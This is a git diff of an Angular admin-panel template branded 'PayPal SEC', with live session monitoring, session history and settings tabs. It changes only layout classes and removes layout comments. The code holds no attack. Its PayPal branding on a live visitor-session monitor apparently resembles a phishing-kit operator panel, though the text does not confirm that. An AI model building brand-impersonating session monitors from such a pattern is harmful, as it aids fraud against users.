@@ -47,7 +47,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       } @else {
 
       <!-- SIDEBAR -->
-      <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0 sticky top-0 lg:static">
+      <aside class="w-full lg:w-[260px] lg:h-full bg-pp-navy text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0 sticky top-0 lg:static">
            <div class="h-16 lg:h-20 flex items-center lg:px-6 lg:border-b border-[#ffffff10]">
               <span class="font-bold text-xl tracking-tight">PayPal <span class="text-pp-success text-xs align-top">SEC</span></span>
            </div>
@@ -105,8 +105,6 @@ type AdminTab = 'live' | 'history' | 'settings';
          </header>
 
          <!-- Content Area -->
-         <!-- Mobile: Grows naturally (min-h-0 is default for flex items but we want flow here) -->
-         <!-- Desktop: Restricted height to trigger scroll -->
          <div class="w-full flex-1 lg:overflow-hidden relative flex flex-col">
             
             @switch (activeTab()) {
@@ -116,8 +114,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                     <div class="flex flex-col lg:flex-row h-full">
                         
                         <!-- List Column -->
-                        <!-- Mobile: Fixed height scrollable area or natural? Let's use fixed height for list so it doesn't push details too far down -->
-                        <div class="lg:w-[350px] bg-white border-b lg:border-b-0 lg:border-r border-slate-200 flex flex-col shrink-0 h-[300px] lg:h-full">
+                        <div class="lg:w-[350px] bg-white border-b lg:border-b-0 lg:border-r border-slate-200 flex flex-col shrink-0 h-[250px] lg:h-full">
                              <div class="p-4 border-b border-slate-100 bg-slate-50/50 flex justify-between items-center shrink-0">
                                  <h3 class="font-bold text-base text-pp-navy">Active Sessions</h3>
                                  <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
@@ -154,8 +151,6 @@ type AdminTab = 'live' | 'history' | 'settings';
                         </div>
 
                         <!-- Details Column -->
-                        <!-- Mobile: Flows naturally with window scroll. sticky header. -->
-                        <!-- Desktop: Overflow-y-auto independently. -->
                         <div class="flex-1 flex flex-col lg:h-full lg:overflow-hidden bg-[#F9FAFB] relative min-h-[500px] lg:min-h-0">
                              @if(monitoredSession()) {
                                  <!-- Header -->
@@ -298,7 +293,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                      </div>
                                  </div>
 
-                                 <!-- Action Bar (Sticky Bottom) -->
+                                 <!-- Action Bar (Fixed Bottom) -->
                                  <div class="p-4 border-t border-slate-200 bg-white/90 backdrop-blur-sm fixed bottom-0 left-0 right-0 lg:absolute lg:bottom-0 z-20 flex justify-between items-center shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)]">
                                      <div class="flex items-center gap-2">
                                          <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
@@ -337,8 +332,6 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                 <!-- HISTORY TAB -->
                 @case ('history') {
-                    <!-- Desktop: Fixed height with internal scroll -->
-                    <!-- Mobile: Natural scroll -->
                     <div class="bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden lg:h-full flex flex-col h-[600px]">
                         <div class="px-8 py-6 border-b border-slate-100">
                             <h3 class="font-bold text-lg text-pp-navy">Session History</h3>
